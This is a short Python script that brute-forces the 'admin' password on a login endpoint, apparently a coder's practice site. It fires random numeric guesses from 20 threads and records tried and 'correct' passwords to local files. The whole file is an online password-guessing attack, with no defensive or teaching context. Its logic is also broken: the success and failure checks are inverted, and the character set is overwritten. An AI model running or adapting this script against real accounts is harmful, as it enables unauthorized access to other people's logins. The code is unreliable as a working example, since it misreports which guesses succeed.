import requests
import random
from threading import Thread



url = "https://requestswebsite.notanothercoder.repl.co/confirm-login"
username ="admin"
def send_request(username, password):
    data = {
        "username": username,
        "password": password 
    }
    r = requests.get(url, data=data)
    return r
 
    
chars = "abcdefghijklmnopqrstuvwxyz0123456789"
chars = "123456789"   
def main():
    while True:
        valid = False
        while not valid:
            rndpasswd = random.choices(chars, k = random.randint(0,3))
            #rndpasswd = random.choices(chars, k=2)
            passwd ="".join(rndpasswd)
            file = open("treis.txt", "r")
            treis = file.read()
            file.close()
            if passwd in treis:
                pass
            else:
                valid = True
                
        r = send_request(username,passwd)
        
        if not 'faild to login' in r.text.lower():
           with open("treis.txt", "a") as f:
                f.write(f'{passwd}\n')
                f.close()
           print(f'incorrect Password {passwd}\n')
        else:
            print(f'correct Password {passwd}\n')
            with open("correct_Pass.txt","w") as f:
                f.write(passwd)


for x in range(20):
   Thread(target=main).start()


